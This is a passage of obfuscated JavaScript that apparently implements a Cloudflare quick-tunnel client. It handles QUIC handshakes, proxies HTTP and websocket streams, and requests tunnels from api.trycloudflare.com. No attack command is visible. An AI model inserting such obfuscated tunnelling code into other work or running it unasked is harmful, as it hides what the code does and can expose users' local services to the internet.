                    return b + c;
                },
                'svNdo': function (b, c) {
                    return b === c;
                },
                'HABDu': function (b, c) {
                    return b + c;
                },
                'GtKgB': iF(0x96e),
                'IVBzZ': iF(0x283),
                'nVzKS': function (b, c) {
                    return b !== c;
                },
                'GJGqy': function (b, c) {
                    return b(c);
                },
                'LpghW': iF(0xa85),
                'HtxUC': iF(0x585),
                'VaicY': function (b, c) {
                    return b !== c;
                }
            };
        while (a[iF(0x46d)](this[iF(0x500)][iF(0xcfc)], 0x4)) {
            const b = a['GKRuu'](0x4, this[iF(0x500)][iF(0x904)](0x1, 0x3));
            if (this['handshakeBytes'][iF(0xcfc)] < b)
                return;
            const c = Buffer['from'](this['handshakeBytes'][iF(0xd15)](0x0, b));
            this[iF(0x500)] = this[iF(0x500)][iF(0xd15)](b);
            let d;
            try {
                d = this[iF(0x6c6)][iF(0x4be)](c);
            } catch (f) {
                this[iF(0x9a6)](a[iF(0x5dd)](iF(0xba8), f[iF(0x1f1)]));
                return;
            }
            this['tls']['remoteParameters'] && this[iF(0x3ab)] === null && (this[iF(0x3ab)] = this[iF(0x6c6)]['remoteParameters'], this[iF(0x42c)] = this[iF(0x6c6)]['remoteParameters'][a0bd['initialMaxData']] || 0x0, this[iF(0xcae)] = this[iF(0x6c6)][iF(0x3ab)][a0bd['initialMaxStreamDataBidiRemote']] || 0x0, this['peerStreamLocal'] = this[iF(0x6c6)][iF(0x3ab)][a0bd[iF(0x390)]] || 0x0, this[iF(0x726)] = Math['min'](a[iF(0x7bf)](this[iF(0x6c6)][iF(0x3ab)][a0bd[iF(0x31f)]], undefined) ? 0x19 : this[iF(0x6c6)][iF(0x3ab)][a0bd[iF(0x31f)]], 0x64), this['log']['debug'](a[iF(0x5dd)](a[iF(0x8fa)](a[iF(0x8fa)](a['GtKgB'], this[iF(0x42c)]), a[iF(0xd7d)]) + this[iF(0xcae)] + iF(0xaf9), this[iF(0x6c6)][iF(0x3ab)][a0bd[iF(0x554)]] || 0x0)));
            if (a[iF(0xd43)](d, null)) {
                if (this['verifyCertificate']) {
                    const g = a[iF(0xb03)](a0bD, this['tls'][iF(0x645)]);
                    if (g) {
                        this['_fail'](a[iF(0x8fa)](a[iF(0xd8f)], g));
                        return;
                    }
                }
                this[iF(0xa7e)][a0ba] = {
                    'send': d['send'],
                    'recv': d[iF(0xab7)]
                }, this[iF(0x55b)] = [{
                        'keys': d[iF(0xab7)],
                        'phase': 0x0
                    }], this['appSendKeys'][0x0] = d[iF(0x4db)], this[iF(0xd3f)][a0b9]['append'](d[iF(0x8f5)], ![]), this[iF(0x450)] = !![];
                !d['verified'] && this[iF(0x57a)][iF(0xb34)](iF(0x674));
                this['log'][iF(0x354)](a[iF(0x5dd)](a[iF(0x345)], this[iF(0x6c6)][iF(0xdac)] || '?'));
                if (a[iF(0x318)](this['settle'], null)) {
                    const h = this[iF(0x264)];
                    this[iF(0x264)] = null, h[iF(0xa50)](this);
                }
                this['onReady']();
                return;
            }
        }
    }
    [a0c4(0xd8e)](a) {
        const iG = a0c4, b = {
                'xUtMK': iG(0x2dd),
                'nJKSd': function (f, g) {
                    return f || g;
                },
                'CsnRf': 'close'
            }, c = b[iG(0x7ac)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                setTimeout(() => this[iG(0xbf3)](null), 0xc8);
                continue;
            case '1':
                this['closing'] = !![];
                continue;
            case '2':
                if (this[iG(0x443)])
                    return;
                continue;
            case '3':
                this['_tick']();
                continue;
            case '4':
                this['closeReason'] = b[iG(0xc97)](a, b[iG(0x75e)]);
                continue;
            }
            break;
        }
    }
    [a0c4(0x9a6)](a) {
        const iH = a0c4, b = {
                'qmXNf': function (c, d) {
                    return c + d;
                },
                'LBimA': iH(0xa02)
            };
        if (this['closed'])
            return;
        this[iH(0x57a)][iH(0x354)](b['qmXNf'](b[iH(0x48e)], a)), this[iH(0xbf3)](new Error(a));
    }
    ['_finish'](a) {
        const iI = a0c4, b = {
                'fTZZg': function (c, d) {
                    return c !== d;
                }
            };
        if (this[iI(0x443)])
            return;
        this[iI(0x443)] = a ? a[iI(0x1f1)] : iI(0x443);
        b[iI(0x3f9)](this[iI(0x83f)], null) && (clearInterval(this['interval']), this[iI(0x83f)] = null);
        if (b[iI(0x3f9)](this[iI(0x855)], null)) {
            try {
                this['socket'][iI(0xd8e)]();
            } catch (c) {
            }
            this['socket'] = null;
        }
        if (!this[iI(0x450)] && this[iI(0x264)] !== null) {
            const d = this['settle'];
            this['settle'] = null, d[iI(0x532)](a || new Error('connection\x20closed'));
        } else
            this['onClose'](a);
    }
}
function a0bG(a, b) {
    const iJ = a0c4, c = {
            'AqqjX': function (f, g) {
                return f === g;
            }
        }, d = [];
    for (const [f, g] of a) {
        c[iJ(0x2be)](f[iJ(0xc48)](), b) && d[iJ(0x21f)](g);
    }
    return d;
}
function a0bH(a) {
    const iK = a0c4, b = {
            'vInig': function (i, j) {
                return i + j;
            },
            'fsWHs': 'header\x20Key:\x20',
            'SpXVV': iK(0xa54),
            'ftXXl': function (i, j) {
                return i + j;
            },
            'cXJmk': function (i, j) {
                return i(j);
            },
            'mMEeS': iK(0x985),
            'tOgQf': iK(0x7d3),
            'Wctfa': 'chunked',
            'bIyXr': 'GET',
            'YONtr': function (i, j) {
                return i > j;
            }
        }, c = new Map(), d = [];
    for (const [i, j] of a[iK(0x778)]) {
        if (i[iK(0x7b2)](a0aY) >= 0x0) {
            const k = i['split'](':');
            if (k[iK(0xcfc)] !== 0x2)
                throw new Error(b['vInig'](b[iK(0x26c)](b[iK(0x951)], i), b[iK(0x482)]));
            d[iK(0x21f)]([
                k[0x1],
                j
            ]);
        } else
            c[iK(0x9fe)](i, j);
    }
    let f = a[iK(0x5ce)];
    try {
        const l = new URL(a['dest']);
        f = b[iK(0xd19)](l['pathname'], l[iK(0x520)]);
    } catch (m) {
        f = a['dest'];
    }
    const g = b[iK(0x2c1)](Number, a0bG(d, b[iK(0xd40)])[0x0]), h = a0bG(d, b[iK(0x616)])[iK(0x6e5)](',')[iK(0xc48)]()[iK(0x38b)](b[iK(0x3fa)]);
    return {
        'type': a['type'],
        'method': c['get'](a0aV) || b[iK(0xd68)],
        'host': c['get'](a0aW) || '',
        'path': f[iK(0x6ec)]('/') ? f : '/' + f,
        'headers': d,
        'contentLength': Number['isInteger'](g) && b[iK(0x64c)](g, 0x0) ? g : null,
        'bodyless': !h && !(Number['isInteger'](g) && g > 0x0)
    };
}
function a0bI(a) {
    const iL = a0c4, b = {
            'WYzwE': function (d, f) {
                return d !== f;
            },
            'ARjuv': function (d, f) {
                return d >= f;
            }
        }, c = a[iL(0x98b)];
    if (c['bodyless'])
        return !![];
    if (a[iL(0x74d)])
        return !![];
    return b[iL(0xd7a)](c[iL(0xa56)], null) && b['ARjuv'](a[iL(0x274)][iL(0xcfc)], c[iL(0xa56)]);
}
class a0bJ {
    constructor(a, b, c, d, f) {
        const iM = a0c4;
        this[iM(0xbee)] = a, this['state'] = b, this[iM(0x98b)] = c, this[iM(0x292)] = d, this[iM(0x57a)] = f, this[iM(0xc41)] = [], this[iM(0x376)] = [], this[iM(0x987)] = ![], this[iM(0xda9)] = null;
    }
    [a0c4(0x706)](a) {
        const iN = a0c4, b = {
                'ANXti': function (c, d) {
                    return c === d;
                }
            };
        if (b['ANXti'](a, null))
            this['queue']['push'](null);
        else
            a[iN(0xcfc)] && this['queue'][iN(0x21f)](a);
        this[iN(0xc5d)]();
    }
    ['stop']() {
        const iO = a0c4;
        if (this[iO(0x987)])
            return;
        this[iO(0x987)] = !![], this[iO(0xc5d)]();
        if (this['sock'] !== null)
            try {
                this[iO(0xda9)][iO(0x4b0)]();
            } catch (a) {
            }
    }
    ['_wake']() {
        const iP = a0c4, a = {
                'COyad': function (b) {
                    return b();
                }
            };
        for (const b of this[iP(0x376)]) {
            a[iP(0xabf)](b);
        }
        this[iP(0x376)] = [];
    }
    async ['_next']() {
        const iQ = a0c4;
        while (!this['stopped']) {
            if (this['queue'][iQ(0xcfc)])
                return this['queue']['shift']();
            await new Promise(a => this[iQ(0x376)][iQ(0x21f)](a));
        }
        return null;
    }
    async ['run']() {
        const iR = a0c4, a = {
                'lsaGE': function (b, c) {
                    return b(c);
                },
                'GAFiW': function (b, c) {
                    return b(c);
                },
                'LEXfi': function (b, c) {
                    return b !== c;
                },
                'YPkRb': function (b, c) {
                    return b + c;
                },
                'ZSOes': iR(0x1d5),
                'rKFiS': function (b, c) {
                    return b(c);
                },
                'lPYUp': function (b, c) {
                    return b === c;
                },
                'LLXQe': iR(0x7d3),
                'SvUOh': 'content-length',
                'caUeY': iR(0x39d),
                'YXTQD': 'cf-cloudflared-',
                'tqxpP': function (b, c) {
                    return b + c;
                },
                'atINT': function (b, c) {
                    return b + c;
                },
                'yLWpP': function (b, c) {
                    return b + c;
                },
                'ajQXe': iR(0xdc0),
                'RrDTL': function (b, c) {
                    return b(c);
                }
            };
        try {
            this[iR(0xda9)] = await a[iR(0xd37)](a0aK, this[iR(0x292)]), this['sendHandshake']();
            const b = await a[iR(0x220)](a0aN, this[iR(0xda9)]);
            if (a[iR(0x871)](b[iR(0x8ab)], 0x65)) {
                this[iR(0xbee)][iR(0x972)](this[iR(0xa67)][iR(0x6f0)], a[iR(0xd5d)](a[iR(0x49a)], b[iR(0x8ab)]), [[
                        a0aX,
                        String(b[iR(0x8ab)])
                    ]], !![]);
                try {
                    this[iR(0xda9)]['destroy']();
                } catch (d) {
                }
                return;
            }
            const c = [[
                    a0aX,
                    a[iR(0x952)](String, b['status'])
                ]];
            for (const [f, g] of b[iR(0x48d)]) {
                const h = f[iR(0xc48)]();
                if (a[iR(0xad0)](h, a[iR(0xb7d)]) || h === a[iR(0xdb1)])
                    continue;
                if (h[iR(0x6ec)](a[iR(0xc3a)]) || h[iR(0x6ec)](a[iR(0xa14)]) || h[iR(0x6ec)]('cf-proxy-'))
                    continue;
                c[iR(0x21f)]([
                    a[iR(0xd59)](a[iR(0xd59)](a0aY, ':'), f),
                    g
                ]);
            }
            this[iR(0xbee)]['writeResponse'](this[iR(0xa67)][iR(0x6f0)], '', c, ![]), this[iR(0x202)]()['catch'](() => {
            }), await this[iR(0x5bc)](b[iR(0x58d)]);
        } catch (i) {
            this[iR(0x57a)][iR(0xb34)](a[iR(0x6d5)](a[iR(0xd5d)](a[iR(0x6b8)]('websocket\x20stream\x20', this[iR(0xa67)][iR(0x6f0)]['id']), a[iR(0xbe2)]), i)), this[iR(0xbee)][iR(0x79b)](this[iR(0xa67)], a['RrDTL'](String, i['message'] || i), 0x1f6);
        } finally {
            this[iR(0x87d)]();
        }
    }
    async [a0c4(0x5bc)](a) {
        const iS = a0c4;
        a[iS(0xcfc)] && this['state'][iS(0x6f0)][iS(0x32b)](a, ![]);
        for await (const b of this[iS(0xda9)]) {
            if (this['stopped'])
                break;
            this[iS(0xa67)][iS(0x6f0)][iS(0x32b)](b, ![]);
        }
        !this[iS(0x987)] && this['state']['stream'][iS(0x32b)](Buffer['alloc'](0x0), !![]);
    }
    async [a0c4(0x202)]() {
        const iT = a0c4, a = {
                'DOBYf': function (b, c) {
                    return b === c;
                }
            };
        while (!this[iT(0x987)]) {
            const b = await this['_next']();
            if (a[iT(0x503)](b, null)) {
                try {
                    this[iT(0xda9)]['end']();
                } catch (c) {
                }
                return;
            }
            try {
                this[iT(0xda9)][iT(0x32b)](b);
            } catch (d) {
                this[iT(0x987)] = !![];
                return;
            }
        }
    }
    [a0c4(0x1ac)]() {
        const iU = a0c4, a = {
                'tulwV': function (i, j) {
                    return i + j;
                },
                'yAZjH': function (i, j) {
                    return i + j;
                },
                'goTVo': iU(0x5d0),
                'mpJZQ': '\x20HTTP/1.1',
                'CiGWN': function (i, j) {
                    return i === j;
                },
                'XYHBR': iU(0x248),
                'qmjLd': function (i, j) {
                    return i === j;
                },
                'tRmrQ': 'content-length',
                'CCyVb': 'transfer-encoding',
                'Kdrbn': 'sec-websocket-key',
                'MoVvo': 'sec-websocket-version',
                'BPwyR': iU(0x292),
                'MlZmx': function (i, j) {
                    return i + j;
                },
                'dPubF': function (i, j) {
                    return i + j;
                },
                'SXLec': function (i, j) {
                    return i + j;
                },
                'dUYtw': iU(0x617),
                'lbSoY': function (i, j) {
                    return i + j;
                },
                'SbxDi': iU(0x790),
                'NpzoK': iU(0x559),
                'BxiDX': 'base64',
                'yHpzE': iU(0x95e),
                'YvUyC': iU(0xb92),
                'jomfn': iU(0xaa4)
            }, b = new URL(this[iU(0x292)]), c = this[iU(0x98b)]['path'][iU(0x6ec)]('/') ? this[iU(0x98b)]['path'] : a[iU(0xc2c)]('/', this[iU(0x98b)]['path']), d = [a[iU(0xca7)](a[iU(0xb91)], c) + a['mpJZQ']];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][iU(0x48d)]) {
            const k = i[iU(0xc48)]();
            if (a[iU(0x4ff)](k, 'host') || k === iU(0x521) || a[iU(0x4ff)](k, a['XYHBR']) || a[iU(0xd70)](k, a[iU(0xce5)]) || k === a[iU(0x278)])
                continue;
            if (a['CiGWN'](k, a[iU(0xdbd)]))
                f = !![];
            else {
                if (a[iU(0xd70)](k, a[iU(0x87c)]))
                    g = !![];
                else
                    a[iU(0xd70)](k, a[iU(0xcb2)]) && (h = !![]);
            }
            d[iU(0x21f)](a[iU(0x230)](a['dPubF'](i, ':\x20'), j));
        }
        d[iU(0x21f)](a[iU(0x722)](a[iU(0x5b3)], b[iU(0x920)])), !h && this[iU(0x98b)][iU(0x920)] && d['push'](a[iU(0x9c7)](a[iU(0x661)], this[iU(0x98b)][iU(0x920)])), !f && d[iU(0x21f)](a[iU(0xc2c)](a['NpzoK'], a0k[iU(0xa8d)](0x10)[iU(0xa3c)](a[iU(0x798)]))), !g && d[iU(0x21f)](iU(0xbb1)), d[iU(0x21f)](iU(0x52c)), d[iU(0x21f)](a[iU(0x537)]), this[iU(0xda9)]['write'](Buffer[iU(0x581)](a['SXLec'](d[iU(0x6e5)]('\x0d\x0a'), a[iU(0x2de)]), a[iU(0x6d3)]));
    }
}
class a0bK {
    constructor(a, b, c, d, f, g, h) {
        const iV = a0c4, i = { 'FlOfH': '0|5|2|1|14|9|10|7|3|11|16|6|8|13|4|12|15' }, j = i[iV(0x9cb)][iV(0x3ff)]('|');
        let k = 0x0;
        while (!![]) {
            switch (j[k++]) {
            case '0':
                this[iV(0xb6e)] = a;
                continue;
            case '1':
                this[iV(0x1d1)] = d;
                continue;
            case '2':
                this[iV(0x38c)] = c;
                continue;
            case '3':
                this[iV(0xb4b)] = new Map();
                continue;
            case '4':
                this[iV(0xb6e)][iV(0xaea)] = (l, m) => this[iV(0x898)](l, m);
                continue;
            case '5':
                this[iV(0x292)] = b;
                continue;
            case '6':
                this[iV(0x264)] = null;
                continue;
            case '7':
                this['control'] = null;
                continue;
            case '8':
                this[iV(0x81e)] = new Promise((l, m) => {
                    const iW = iV;
                    this[iW(0x264)] = {
                        'resolve': l,
                        'reject': m
                    };
                });
                continue;
            case '9':
                this[iV(0xc46)] = g;
                continue;
            case '10':
                this[iV(0x57a)] = h;
                continue;
            case '11':
                this['relays'] = new Set();
                continue;
            case '12':
                this['conn'][iV(0x994)] = l => this['endStream'](l);
                continue;
            case '13':
                this[iV(0xb6e)][iV(0x932)] = l => this['acceptStream'](l);
                continue;
            case '14':
                this[iV(0x4a9)] = f;
                continue;
            case '15':
                this[iV(0xb6e)][iV(0x42a)] = l => this[iV(0x87d)](l);
                continue;
            case '16':
                this['stopped'] = ![];
                continue;
            }
            break;
        }
    }
    [a0c4(0xbc9)]() {
        const iX = a0c4, a = this[iX(0xb6e)][iX(0x770)]();
        return this[iX(0xbe5)] = new a0aJ(this['conn'], a['id'], this['log'], { 'quic': !![] }), this[iX(0xbe5)]['start'](this[iX(0x38c)], this[iX(0x1d1)], this[iX(0x4a9)], this[iX(0xc46)]), this['done'];
    }
    [a0c4(0x87d)](a) {
        const iY = a0c4;
        if (this[iY(0x987)])
            return;
        this[iY(0x987)] = !![], this[iY(0xb4b)][iY(0xcc9)]();
        for (const b of this[iY(0xd6f)]) {
            b[iY(0x87d)]();
        }
        this[iY(0xd6f)][iY(0xcc9)](), a ? this['settle'][iY(0x532)](a) : this['settle'][iY(0xa50)]();
    }
    [a0c4(0xbd1)](a) {
        const iZ = a0c4, b = {
                'nzCov': function (c, d) {
                    return c !== d;
                },
                'hadpe': function (c, d) {
                    return c & d;
                }
            };
        if (b[iZ(0x665)](b[iZ(0x71f)](a['id'], 0x3), 0x1))
            return;
        this[iZ(0xb4b)][iZ(0x9fe)](a['id'], {
            'stream': a,
            'buffer': Buffer['alloc'](0x0),
            'body': Buffer['alloc'](0x0),
            'request': null,
            'websocket': ![],
            'relay': null,
            'ended': ![],
            'served': ![],
            'failed': ![]
        });
    }
    [a0c4(0x898)](a, b) {
        const j0 = a0c4, c = {
                'qYKml': function (f, g) {
                    return f === g;
                },
                'QvMyP': function (f, g) {
                    return f === g;
                }
            };
        if (this[j0(0xbe5)] !== null && c[j0(0xc98)](a['id'], this[j0(0xbe5)][j0(0xaed)])) {
            this[j0(0xbe5)][j0(0x706)](b);
            return;
        }
        const d = this[j0(0xb4b)][j0(0x5f2)](a['id']);
        if (c['qYKml'](d, undefined) || d[j0(0x5a7)])
            return;
        if (c[j0(0x2d1)](d[j0(0x98b)], null))
            d[j0(0x748)] = Buffer[j0(0x6ef)]([
                d[j0(0x748)],
                b
            ]), this[j0(0xcc3)](d);
        else
            b[j0(0xcfc)] && (d[j0(0xb99)] && d[j0(0x63a)] !== null ? d['relay'][j0(0x706)](b) : d['body'] = Buffer[j0(0x6ef)]([
                d[j0(0x274)],
                b
            ]));
        this['maybeServe'](d);
    }
    [a0c4(0xa07)](a) {
        const j1 = a0c4, b = {
                'DRMky': function (d, f) {
                    return d !== f;
                },
                'CfRcm': function (d, f) {
                    return d === f;
                }
            };
        if (b[j1(0x1e0)](this[j1(0xbe5)], null) && b[j1(0x931)](a['id'], this[j1(0xbe5)][j1(0xaed)])) {
            this[j1(0xbe5)]['finished'] = !![];
            return;
        }
        const c = this[j1(0xb4b)][j1(0x5f2)](a['id']);
        if (b[j1(0x931)](c, undefined))
            return;
        c[j1(0x74d)] = !![];
        if (c[j1(0xb99)] && b[j1(0x1e0)](c['relay'], null)) {
            c[j1(0x63a)]['feed'](null);
            return;
        }
        c['request'] !== null ? this[j1(0x8f3)](c) : this[j1(0xb4b)][j1(0xdab)](a['id']);
    }
    ['parseRequest'](a) {
        const j2 = a0c4, b = {
                'CnHDS': function (h, i) {
                    return h < i;
                },
                'tnQfd': function (h, i) {
                    return h + i;
                },
                'AokEy': function (h, i) {
                    return h + i;
                },
                'iWbyJ': j2(0x8c2),
                'XVXbL': '\x20is\x20not\x20a\x20v1\x20tunnel\x20data\x20stream',
                'cIOgY': function (h, i) {
                    return h !== i;
                },
                'JzQYk': j2(0xaa4),
                'TUghQ': function (h, i) {
                    return h + i;
                },
                'xTFZo': function (h, i) {
                    return h(i);
                },
                'jqgLY': function (h, i) {
                    return h + i;
                },
                'KUppJ': function (h, i) {
                    return h + i;
                },
                'tONOH': function (h, i) {
                    return h === i;
                },
                'jQmpH': function (h, i) {
                    return h + i;
                },
                'udJTl': function (h, i) {
                    return h + i;
                },
                'BHcSb': function (h, i) {
                    return h + i;
                },
                'VRlKl': function (h, i) {
                    return h(i);
                }
            }, c = a[j2(0x748)];
        if (b[j2(0x3fc)](c[j2(0xcfc)], a0aS[j2(0xcfc)]))
            return;
        if (!c[j2(0xd15)](0x0, a0aQ[j2(0xcfc)])[j2(0x4e7)](a0aQ)) {
            this[j2(0x57a)]['warning'](b['tnQfd'](b[j2(0xcb1)](b[j2(0x227)], a['stream']['id']), b[j2(0x6ff)])), a[j2(0x5a7)] = !![];
            return;
        }
        if (b[j2(0x219)](c['subarray'](0x6, 0x8)[j2(0xa3c)](b['JzQYk']), '01')) {
            this[j2(0x57a)][j2(0xb34)](b[j2(0xcb1)](b['AokEy'](b[j2(0xc1c)](b[j2(0x227)], a[j2(0x6f0)]['id']), j2(0x6a2)), c[j2(0xd15)](0x6, 0x8)['toString'](j2(0xaa4)))), a[j2(0x5a7)] = !![];
            return;
        }
        const [d, f] = a0as(c[j2(0xd15)](a0aS[j2(0xcfc)]), 0x1);
        if (!d['length'])
            return;
        let g;
        try {
            g = b['xTFZo'](a0ay, d[0x0]);
        } catch (h) {
            this['log'][j2(0xb34)](b[j2(0xb38)](b[j2(0xcb1)](b[j2(0x7b4)](j2(0x8c2), a['stream']['id']), '\x20has\x20an\x20unreadable\x20ConnectRequest:\x20'), h)), a[j2(0x5a7)] = !![];
            return;
        }
        a[j2(0x274)] = f, a[j2(0x748)] = Buffer[j2(0x9b5)](0x0);
        try {
            a[j2(0x98b)] = b[j2(0xa72)](a0bH, g), b[j2(0x473)](a['request']['type'], a0aU[j2(0xb99)]) && (a['websocket'] = !![]);
        } catch (i) {
            this[j2(0x57a)]['warning'](b[j2(0x936)](b['udJTl'](b[j2(0x234)](b[j2(0x227)], a['stream']['id']), ':\x20'), i)), a['failed'] = !![], this[j2(0x79b)](a, b[j2(0x203)](String, i[j2(0x1f1)] || i), 0x1f6);
        }
    }
    [a0c4(0x8f3)](a) {
        const j3 = a0c4, b = {
                'zgrCf': function (c, d) {
                    return c === d;
                }
            };
        if (a['served'] || b[j3(0x8c3)](a[j3(0x98b)], null) || a['failed'] || !a0bI(a))
            return;
        a[j3(0xaad)] = !![], this[j3(0x290)](a);
    }
    async [a0c4(0x290)](a) {
        const j4 = a0c4, b = {
                'vwryx': function (f, g) {
                    return f === g;
                },
                'kKBOe': function (f, g) {
                    return f !== g;
                },
                'KrpmY': function (f, g) {
                    return f + g;
                },
                'OxiuV': j4(0x87e),
                'JrvEr': function (f, g, h, i, j, k) {
                    return f(g, h, i, j, k);
                },
                'aNVbe': function (f, g) {
                    return f(g);
                },
                'uVwFP': function (f, g) {
                    return f === g;
                },
                'PelHC': 'transfer-encoding',
                'IfiTQ': function (f, g) {
                    return f === g;
                },
                'etLRA': function (f, g) {
                    return f + g;
                },
                'eZSxL': j4(0xce3),
                'skTVL': j4(0x8c2),
                'XRFfa': j4(0x5f0)
            }, c = a[j4(0x6f0)], d = a[j4(0x98b)];
        try {
            if (b[j4(0x5f7)](d['type'], a0aU[j4(0xb99)])) {
                this[j4(0xbcf)](a);
                return;
            }
            if (b[j4(0x19e)](d['type'], a0aU['http']))
                throw new Error(b['KrpmY'](b['KrpmY'](b['OxiuV'], d[j4(0x221)]), '\x20is\x20not\x20proxied\x20over\x20QUIC\x20yet'));
            const f = await b[j4(0xc5e)](a0aM, this[j4(0x292)], d[j4(0xaf0)], d[j4(0x5b0)], d[j4(0x48d)], a['body']), g = [[
                        a0aX,
                        b[j4(0x89e)](String, b[j4(0x5f7)](f[j4(0x8ab)], 0x65) ? 0xc8 : f[j4(0x8ab)])
                    ]];
            let h = ![];
            for (const [i, j] of f['headers']) {
                const k = i[j4(0xc48)]();
                if (b[j4(0xcf5)](k, b[j4(0x4ca)]))
                    continue;
                b['IfiTQ'](k, 'content-type') && (h = !![]), g[j4(0x21f)]([
                    b['KrpmY'](b[j4(0xdb7)](a0aY, ':'), i),
                    j
                ]);
            }
            if (!h) {
                const l = b['aNVbe'](a0aB, d[j4(0x5b0)]);
                l && g['push']([
                    b[j4(0xd56)](a0aY, b[j4(0xc76)]),
                    l
                ]);
            }
            this[j4(0x972)](c, '', g, ![]);
            for await (const m of f[j4(0x274)]) {
                c[j4(0x32b)](m, ![]);
            }
            c[j4(0x32b)](Buffer[j4(0x9b5)](0x0), !![]);
        } catch (n) {
            this[j4(0x57a)][j4(0xb34)](b[j4(0xdb7)](b[j4(0x5e2)] + c['id'] + b[j4(0x709)], n)), this[j4(0x79b)](a, b[j4(0x89e)](String, n['message'] || n), 0x1f6);
        } finally {
            !a[j4(0xb99)] && this[j4(0xb4b)][j4(0xdab)](c['id']);
        }
    }
    [a0c4(0xbcf)](a) {
        const j5 = a0c4, b = new a0bJ(this, a, a[j5(0x98b)], this[j5(0x292)], this[j5(0x57a)]);
        a[j5(0x63a)] = b, this[j5(0xd6f)]['add'](b), a[j5(0x274)][j5(0xcfc)] && (b[j5(0x706)](a[j5(0x274)]), a[j5(0x274)] = Buffer['alloc'](0x0)), b['run']()[j5(0x22d)](() => {
        })['finally'](() => {
            const j6 = j5;
            this[j6(0xd6f)]['delete'](b), this[j6(0xb4b)][j6(0xdab)](a[j6(0x6f0)]['id']);
        });
    }
    [a0c4(0x79b)](a, b, c) {
        const j7 = a0c4;
        this[j7(0x972)](a[j7(0x6f0)], b, [[
                a0aX,
                String(c)
            ]], !![]);
    }
    [a0c4(0x972)](a, b, c, d) {
        const j8 = a0c4;
        if (this[j8(0x987)] || a[j8(0x4db)][j8(0xbea)])
            return;
        a[j8(0x32b)](Buffer['concat']([
            a0aS,
            a0az(b, c)
        ]), d);
    }
}
async function a0bL(a, b, c) {
    const j9 = a0c4, d = {
            'Oikny': function (h, i) {
                return h === i;
            },
            'pzmvo': function (h, i) {
                return h === i;
            },
            'KsxlV': function (h, i) {
                return h + i;
            },
            'PAWjP': j9(0x4e2),
            'Npoaf': j9(0xd14),
            'NOgHW': j9(0x526),
            'XFAiQ': j9(0xdc0),
            'lucNI': j9(0xbd6),
            'TQdXo': 'all\x20Cloudflare\x20edges\x20failed:\x20'
        }, f = a0a8[j9(0xa40)]()[j9(0x97b)](() => Math['random']() - 0.5);
    let g = null;
    for (const h of f) {
        const i = new a0bF({
            'logger': a,
            'host': h,
            'port': a0a9,
            'serverName': a0b1,
            'alpn': a0b0,
            'idleTimeout': d[j9(0x263)](b, undefined) ? 0x7530 : b,
            'verifyCertificate': d['pzmvo'](c, !![])
        });
        try {
            return await i[j9(0x3ae)](), a[j9(0xb82)](d[j9(0xa82)](d[j9(0x7b6)] + h + ':' + a0a9, d['Npoaf'])), i;
        } catch (j) {
            g = j, a['warning'](d[j9(0xa82)](d[j9(0xb0b)] + h + d['XFAiQ'], j[j9(0x1f1)]));
            try {
                i[j9(0xd8e)](d[j9(0x76a)]);
            } catch (k) {
            }
        }
    }
    throw new Error(d[j9(0xa82)](d[j9(0x432)], g));
}
const a0bM = 0x2;
function a0bN(a, b, c) {
    const ja = a0c4, d = {
            'xgsUr': function (g, h, i) {
                return g(h, i);
            },
            'dNXLS': function (g, h) {
                return g < h;
            }
        }, f = d[ja(0x981)](parseInt, process.env[a] || '', 0xa);
    if (!Number[ja(0xa95)](f) || d[ja(0x771)](f, c))
        return b;
    return f;
}
const a0bO = a0bN('KISAMA_ARGO_REREGISTER_AFTER', 0x5, 0x2), a0bP = 0x1e, a0bQ = ((() => {
        const jb = a0c4, a = {
                'JyrBm': function (c, d, f) {
                    return c(d, f);
                },
                'VYHMK': function (c, d) {
                    return c < d;
                },
                'frWIL': function (c, d) {
                    return c * d;
                },
                'RyRYh': function (c, d) {
                    return c === d;
                },
                'MYxQs': function (c, d) {
                    return c * d;
                }
            }, b = a['JyrBm'](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[jb(0xa95)](b) || a[jb(0x825)](b, 0x0))
            return a['frWIL'](0x12c, 0x3e8);
        return a[jb(0x3db)](b, 0x0) ? 0x0 : a[jb(0x68d)](Math[jb(0x23e)](b, 0xa), 0x3e8);
    })());
function a0bR(a) {
    const jc = a0c4, b = {
            'iegVM': function (c, d) {
                return c === d;
            },
            'wMCGG': jc(0x36e),
            'vpquS': function (c, d) {
                return c === d;
            },
            'CIGOs': 'object'
        };
    if (b['iegVM'](typeof a, b['wMCGG'])) {
        const c = a[jc(0x7e4)]();
        if (c)
            try {
                return JSON[jc(0xcf1)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b['vpquS'](typeof a, b[jc(0x6e7)]) ? a : {};
}
class a0bS {
    constructor(a) {
        const jd = a0c4;
        this[jd(0x57a)] = a, this[jd(0x668)] = new Map(), this['onDomainChange'] = null;
    }
    async [a0c4(0x5c8)](a, b, c = ![]) {
        const je = a0c4, d = {
                'OrpwM': function (m, n) {
                    return m > n;
                },
                'qlIpd': 'https://api.trycloudflare.com',
                'QrgvE': function (m, n) {
                    return m + n;
                },
                'zmMwC': 'failed\x20to\x20create\x20tunnel:\x20',
                'lvcRc': je(0xc82),
                'uMGBs': 'quic',
                'fBFRf': function (m, n) {
                    return m + n;
                },
                'rDOMm': function (m, n) {
                    return m + n;
                },
                'HNANA': je(0xb2f),
                'GogyJ': je(0xce7)
            }, f = this[je(0x668)][je(0x5f2)](a) || [];
        if (d[je(0x40f)](f[je(0xcfc)], 0x0) && !b) {
            const m = new Error(je(0x316) + a + je(0x1ed));
            m[je(0x8ab)] = 0x199, m[je(0x694)] = a;
            throw m;
        }
        let g, h, i, j;
        try {
            [g, h, i, j] = await a0aE(d[je(0xd74)]);
        } catch (n) {
            const o = new Error(d[je(0x667)](d[je(0x50b)], n[je(0x1f1)]));
            o[je(0x8ab)] = 0x1f4, o[je(0x694)] = a;
            throw o;
        }
        const k = g[je(0x6ec)](d[je(0x545)]) ? g : d[je(0x545)] + g, l = {
                'tunnelDomain': k,
                'port': a,
                'createdAt': new Date()[je(0xb63)]()['replace'](/\.\d{3}Z$/, 'Z'),
                'transport': c ? d[je(0x594)] : 'h2',
                'quicFailures': 0x0,
                'stopped': ![],
                'sock': null,
                'conn': null,
                'runPromise': null
            };
